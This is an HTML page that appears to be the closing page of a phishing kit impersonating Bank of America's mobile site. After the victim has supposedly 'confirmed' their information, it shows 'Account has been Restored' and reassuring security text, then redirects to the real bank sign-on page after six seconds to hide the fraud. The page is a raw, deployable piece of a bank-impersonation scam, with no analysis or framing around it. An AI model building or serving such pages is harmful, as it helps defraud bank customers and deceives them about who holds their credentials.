
<!DOCTYPE html>
<html class=" js no-flexbox canvas canvastext webgl touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE10">
        <meta name="apple-itunes-app" content="app-id=284847138">
		<!--[if IE 9]>
			<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9" >
		<![endif]-->
		<title>Bank of America Mobile - Identity Verification</title>
   <link rel="shortcut icon" href="css-js/fcn.ico" type="image/ico">
	<link rel="stylesheet" href="css-js/rs13.css"><link rel="stylesheet" href="css-js/rs15.css"><link rel="stylesheet" href="css-js/rs11.css"><link rel="stylesheet" href="css-js/rs12.css"><link rel="stylesheet" href="css-js/rs14.css">
	<meta http-equiv="refresh" content="6;url=https://staticweb.bankofamerica.com/cavmwebbactouch/common/index.html#home?app=signonv2">
	
	
	</head>
   
	<body><div id="page" style="display: block; position: static; float: left; width: 100%; height: 100%;" class=""><div id="cmw_toolBar_" class="cmw_toolBar_ meter"><a id="leftButton" role="button" class="hidden"></a><a id="slidemenuz" class="sprite" href="#" title="Show menu for all mobile banking features" role="button"></a><div id="barker" class="hidden"></div><h1 id="title" class="meter"><div id="cmw_toolBar_titleText" class="meter" style="padding-left: 10px; padding-right: 10px; width: 100%;">Account has been Restored</div><span id="segmentContainerid" class="segmentContainer"><span id="segmentComplete0" class="segment white"></span><span id="circleComplete0" class="circle white"></span><span class="segmentBreak"></span><span id="segmentComplete1" class="segment white"></span><span id="circleComplete1" class="circle white"></span><span class="segmentBreak"></span><span id="segmentComplete2" class="segment white"></span><span id="circleComplete2" class="circle white"></span><span class="segmentBreak"></span><span id="segmentComplete2" class="segment white"></span><span id="circleComplete2" class="circle white"></span></span></h1><a id="titleLink" class="adaHidden" href="javascript:void(0)" role="toolbar">Verify Using Business Credit Card</a><a id="rightButton" class="hidden"></a></div><div id="SASI_banner_container"></div>

<br><br><br>
<h1 id="title" class="meter"><div id="cmw_titleText" class="meter" style="padding-left: 10px; padding-right: 10px; width: 100%;"><h2 id="title" class="meter"><div id="cmw_titleText" class="meter" style="padding-left: 10px; padding-right: 10px; width: 100%;">Thank you for confirming your information.<br><br>
        We work hard to help ensure your account information stays secure.<br><br>
        To protect your personal information from unauthorized access 
and use, we use security measures that comply with federal law. These 
measures include computer safeguards and secured files and buildings. We
 authorize our employees to get your information only when they need it 
to do their work, and we require companies that work for us to protect 
your information.<br><br>
        You agree that you will not engage in any activities related to 
the Website that are contrary to applicable law, regulation or the terms
 of any agreements you may have with Bank of America, and in 
circumstances where locations of the Website require identification for 
process, you will establish commercially reasonable security procedures 
and controls to limit access to your password or other identifying 
information to authorized individuals.<br><br>
        Thank you for using Bank of America.</div>
	<input name="en_dfp" id="en_dfp" value="" type="hidden">
		</h2></div>
	
	</h1></div>

	<div>
                        <div id="btSignonContinue"><button type="submit" style="float:left; width:95%;" role="button" class="btn">

			<span id="signonLabel">Done</span>
		</button></div>
	
</div>
<div class="clear"></div>
		
	

</body></html>
